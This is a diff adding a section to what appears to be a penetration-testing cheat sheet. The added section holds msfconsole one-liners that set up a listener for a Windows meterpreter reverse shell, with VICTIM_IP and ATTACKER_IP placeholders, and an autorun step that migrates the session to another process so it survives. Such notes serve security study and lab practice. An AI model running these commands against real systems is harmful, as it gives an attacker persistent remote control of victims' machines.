@@ -402,6 +402,22 @@ sudo apt install -y shellter wine32
 
 5. We can then select a payload from the list using `L`, Listed payload, option. And configure the `LHOST` `LPORT` parameter for our reverse shell.
 
+## `msfconsole`
+
+* Prepare a Handler for reverse TCP shell (For windows)
+```bash
+msfconsole -x "use exploit/multi/handler; set RHOST VICTIM_IP; set LHOST ATTACKER_IP; set LPORT 1337; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"
+```
+
+* To prevent reverse shellcode get cancelled due to host program got terminated, we can setup an autorun script that can migrate the meterpreter to a separate process immediately after establish connection. 
+```bash
+set AutoRunScript post/windows/manage/migrate
+```
+* Combine above to get a one liner
+```
+msfconsole -x "use exploit/multi/handler; set RHOST VICTIM_IP; set LHOST ATTACKER_IP; set LPORT 1337; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript post/windows/manage/migrate; exploit"
+```
+
 
 ## `msf-nasm_shell`
 `nasm`, the Netwide Assembler, is an assembler and disassembler for Intel x86 architecture. We can `msf-nasm_shell` use to find a corresponding Assembly Opcodes for a target Assembly code.
